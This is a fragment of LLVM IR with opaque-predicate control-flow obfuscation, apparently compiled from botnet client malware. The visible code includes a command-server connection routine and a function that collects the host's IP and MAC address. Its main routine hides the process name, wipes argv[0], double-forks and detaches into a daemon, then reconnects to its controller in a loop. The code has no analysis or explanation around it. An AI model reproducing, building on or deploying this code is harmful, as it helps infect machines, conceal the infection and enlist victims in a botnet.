  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #10
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %35
  %53 = load i32, i32* @x.75
  %54 = load i32, i32* @y.76
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %61, i32* @mainCommSock, align 4
  %62 = load i32, i32* @mainCommSock, align 4
  %63 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %64 = load i32, i32* %3, align 4
  %65 = call i32 @connectTimeout(i32 %62, i8* %63, i32 %64, i32 30)
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.75
  %68 = load i32, i32* @y.76
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %66, label %76, label %75

; <label>:75:                                     ; preds = %originalBBpart24
  store i32 1, i32* %1, align 4
  br label %93

; <label>:76:                                     ; preds = %originalBBpart24
  %77 = load i32, i32* @x.75
  %78 = load i32, i32* @y.76
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  store i32 0, i32* %1, align 4
  %85 = load i32, i32* @x.75
  %86 = load i32, i32* @y.76
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %originalBBpart28, %75
  %94 = load i32, i32* %1, align 4
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %7
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @close(i32 %95)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %97 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %97, i32* @mainCommSock, align 4
  %98 = load i32, i32* @mainCommSock, align 4
  %99 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %100 = load i32, i32* %3, align 4
  %101 = call i32 @connectTimeout(i32 %98, i8* %99, i32 %100, i32 30)
  %102 = icmp ne i32 %101, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  store i32 0, i32* %1, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %229

; <label>:16:                                     ; preds = %0
  %17 = load i32, i32* @x.77
  %18 = load i32, i32* @y.78
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 16, i32 4, i1 false)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.58, i32 0, i32 0)) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 53) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %2, align 4
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* %33, i32 16)
  store i32 %34, i32* %4, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp eq i32 %35, -1
  %37 = load i32, i32* @x.77
  %38 = load i32, i32* @y.78
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i32 0, i32* %1, align 4
  br label %229

; <label>:46:                                     ; preds = %originalBBpart2
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %46
  store i32 0, i32* %1, align 4
  br label %229

; <label>:53:                                     ; preds = %46
  %54 = load i32, i32* @x.77
  %55 = load i32, i32* @y.78
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %63 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %62, i32 0, i32 0
  %64 = load i32, i32* %63, align 4
  store i32 %64, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %65 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.59, i32 0, i32 0), i32 0)
  store i32 %65, i32* %7, align 4
  %66 = load i32, i32* @x.77
  %67 = load i32, i32* @y.78
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:74:                                     ; preds = %originalBBpart216, %originalBBpart24
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = load i32, i32* %7, align 4
  %77 = call i8* @fdgets(i8* %75, i32 4096, i32 %76)
  %78 = icmp ne i8* %77, null
  br i1 %78, label %79, label %145

; <label>:79:                                     ; preds = %74
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %81 = call i8* @strstr(i8* %80, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %82 = icmp ne i8* %81, null
  br i1 %82, label %83, label %127

; <label>:83:                                     ; preds = %79
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %84, i8** %9, align 8
  br label %85

; <label>:85:                                     ; preds = %106, %83
  %86 = load i32, i32* @x.77
  %87 = load i32, i32* @y.78
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i8*, i8** %9, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp ne i32 %96, 9
  %98 = load i32, i32* @x.77
  %99 = load i32, i32* @y.78
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %97, label %106, label %109

; <label>:106:                                    ; preds = %originalBBpart28
  %107 = load i8*, i8** %9, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %9, align 8
  br label %85

; <label>:109:                                    ; preds = %originalBBpart28
  %110 = load i32, i32* @x.77
  %111 = load i32, i32* @y.78
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i8*, i8** %9, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* @x.77
  %120 = load i32, i32* @y.78
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %145

; <label>:127:                                    ; preds = %79
  %128 = load i32, i32* @x.77
  %129 = load i32, i32* @y.78
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %127
  %136 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %136, i8 0, i64 4096, i32 16, i1 false)
  %137 = load i32, i32* @x.77
  %138 = load i32, i32* @y.78
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %74

; <label>:145:                                    ; preds = %originalBBpart212, %74
  %146 = load i32, i32* @x.77
  %147 = load i32, i32* @y.78
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %145
  %154 = load i32, i32* %7, align 4
  %155 = call i32 @close(i32 %154)
  %156 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %157 = load i8, i8* %156, align 16
  %158 = icmp ne i8 %157, 0
  %159 = load i32, i32* @x.77
  %160 = load i32, i32* @y.78
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %158, label %167, label %226

; <label>:167:                                    ; preds = %originalBBpart220
  %168 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %169 = bitcast %union.anon.6* %168 to [16 x i8]*
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %169, i32 0, i32 0
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %172 = call i8* @strcpy(i8* %170, i8* %171) #2
  %173 = load i32, i32* %2, align 4
  %174 = call i32 (i32, i64, ...) @ioctl(i32 %173, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %175

; <label>:175:                                    ; preds = %222, %167
  %176 = load i32, i32* @x.77
  %177 = load i32, i32* @y.78
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %175
  %184 = load i32, i32* %10, align 4
  %185 = icmp slt i32 %184, 6
  %186 = load i32, i32* @x.77
  %187 = load i32, i32* @y.78
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %185, label %194, label %225

; <label>:194:                                    ; preds = %originalBBpart224
  %195 = load i32, i32* @x.77
  %196 = load i32, i32* @y.78
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %194
  %203 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %204 = bitcast %union.anon.7* %203 to %struct.sockaddr*
  %205 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %204, i32 0, i32 1
  %206 = getelementptr inbounds [14 x i8], [14 x i8]* %205, i32 0, i32 0
  %207 = load i32, i32* %10, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds i8, i8* %206, i64 %208
  %210 = load i8, i8* %209, align 1
  %211 = load i32, i32* %10, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %212
  store i8 %210, i8* %213, align 1
  %214 = load i32, i32* @x.77
  %215 = load i32, i32* @y.78
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %222

; <label>:222:                                    ; preds = %originalBBpart228
  %223 = load i32, i32* %10, align 4
  %224 = add nsw i32 %223, 1
  store i32 %224, i32* %10, align 4
  br label %175

; <label>:225:                                    ; preds = %originalBBpart224
  br label %226

; <label>:226:                                    ; preds = %225, %originalBBpart220
  %227 = load i32, i32* %2, align 4
  %228 = call i32 @close(i32 %227)
  br label %229

; <label>:229:                                    ; preds = %226, %52, %45, %15
  %230 = load i32, i32* @x.77
  %231 = load i32, i32* @y.78
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %229
  %238 = load i32, i32* %1, align 4
  %239 = load i32, i32* @x.77
  %240 = load i32, i32* @y.78
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  ret i32 %238

originalBBalteredBB:                              ; preds = %originalBB, %16
  %247 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %247, i8 0, i64 16, i32 4, i1 false)
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %248, align 4
  %249 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.58, i32 0, i32 0)) #2
  %250 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %251 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %250, i32 0, i32 0
  store i32 %249, i32* %251, align 4
  %252 = call zeroext i16 @htons(i16 zeroext 53) #13
  %253 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %252, i16* %253, align 2
  %254 = load i32, i32* %2, align 4
  %255 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %256 = call i32 @connect(i32 %254, %struct.sockaddr* %255, i32 16)
  store i32 %256, i32* %4, align 4
  %257 = load i32, i32* %4, align 4
  %258 = icmp eq i32 %257, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %259 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %260 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 4
  store i32 %261, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %262 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.59, i32 0, i32 0), i32 0)
  store i32 %262, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %263 = load i8*, i8** %9, align 8
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp ne i32 %265, 9
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  %267 = load i8*, i8** %9, align 8
  store i8 0, i8* %267, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %127
  %268 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %268, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %145
  %269 = load i32, i32* %7, align 4
  %270 = call i32 @close(i32 %269)
  %271 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %272 = load i8, i8* %271, align 16
  %273 = icmp ne i8 %272, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %175
  %274 = load i32, i32* %10, align 4
  %275 = icmp slt i32 %274, 6
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %194
  %276 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %277 = bitcast %union.anon.7* %276 to %struct.sockaddr*
  %278 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %277, i32 0, i32 1
  %279 = getelementptr inbounds [14 x i8], [14 x i8]* %278, i32 0, i32 0
  %280 = load i32, i32* %10, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds i8, i8* %279, i64 %281
  %283 = load i8, i8* %282, align 1
  %284 = load i32, i32* %10, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %285
  store i8 %283, i8* %286, align 1
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %229
  %287 = load i32, i32* %1, align 4
  br label %originalBB30
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = load i32, i32* @x.81
  %4 = load i32, i32* @y.82
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [4096 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca [1024 x i8], align 16
  %28 = alloca i32, align 4
  %29 = alloca [10 x i8*], align 16
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  store i32 0, i32* %11, align 4
  store i32 %0, i32* %12, align 4
  store i8** %1, i8*** %13, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i8** %14, align 8
  %33 = call i8* @getBuild()
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.62, i32 0, i32 0), i8* %33)
  %35 = load i8**, i8*** %13, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = load i8**, i8*** %13, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i64 @strlen(i8* %40) #10
  %42 = call i8* @strncpy(i8* %37, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i64 %41) #2
  %43 = load i8**, i8*** %13, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i8** %44, align 8
  %45 = load i8*, i8** %14, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %46, i32 0, i32 0, i32 0)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = call i32 @getpid() #2
  %50 = xor i32 %48, %49
  call void @srand(i32 %50) #2
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = call i32 @getpid() #2
  %53 = xor i32 %51, %52
  call void @init_rand(i32 %53)
  %54 = call i32 @getOurIP()
  %55 = call i32 @fork() #2
  store i32 %55, i32* %15, align 4
  %56 = icmp ne i32 %55, 0
  %57 = load i32, i32* @x.81
  %58 = load i32, i32* @y.82
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %84

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.81
  %67 = load i32, i32* @y.82
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %65
  %74 = load i32, i32* %15, align 4
  %75 = call i32 @waitpid(i32 %74, i32* %17, i32 0)
  call void @exit(i32 0) #14
  %76 = load i32, i32* @x.81
  %77 = load i32, i32* @y.82
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  unreachable

; <label>:84:                                     ; preds = %originalBBpart2
  %85 = load i32, i32* %15, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %146, label %87

; <label>:87:                                     ; preds = %84
  %88 = call i32 @fork() #2
  store i32 %88, i32* %16, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %107

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* @x.81
  %92 = load i32, i32* @y.82
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %90
  call void @exit(i32 0) #14
  %99 = load i32, i32* @x.81
  %100 = load i32, i32* @y.82
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  unreachable

; <label>:107:                                    ; preds = %87
  %108 = load i32, i32* @x.81
  %109 = load i32, i32* @y.82
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %107
  %116 = load i32, i32* %16, align 4
  %117 = icmp ne i32 %116, 0
  %118 = load i32, i32* @x.81
  %119 = load i32, i32* @y.82
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %117, label %127, label %126

; <label>:126:                                    ; preds = %originalBBpart227
  br label %128

; <label>:127:                                    ; preds = %originalBBpart227
  br label %128

; <label>:128:                                    ; preds = %127, %126
  %129 = load i32, i32* @x.81
  %130 = load i32, i32* @y.82
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %128
  %137 = load i32, i32* @x.81
  %138 = load i32, i32* @y.82
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %145

; <label>:145:                                    ; preds = %originalBBpart231
  br label %147

; <label>:146:                                    ; preds = %84
  br label %147

; <label>:147:                                    ; preds = %146, %145
  br label %148

; <label>:148:                                    ; preds = %147
  %149 = call i32 @setsid() #2
  %150 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0)) #2
  %151 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %152

; <label>:152:                                    ; preds = %797, %originalBBpart235, %148
  %153 = call i32 @initConnection()
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %155, label %173

; <label>:155:                                    ; preds = %152
  %156 = load i32, i32* @x.81
  %157 = load i32, i32* @y.82
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %155
  %164 = call i32 @sleep(i32 5)
  %165 = load i32, i32* @x.81
  %166 = load i32, i32* @y.82
  %167 = sub i32 %165, 1
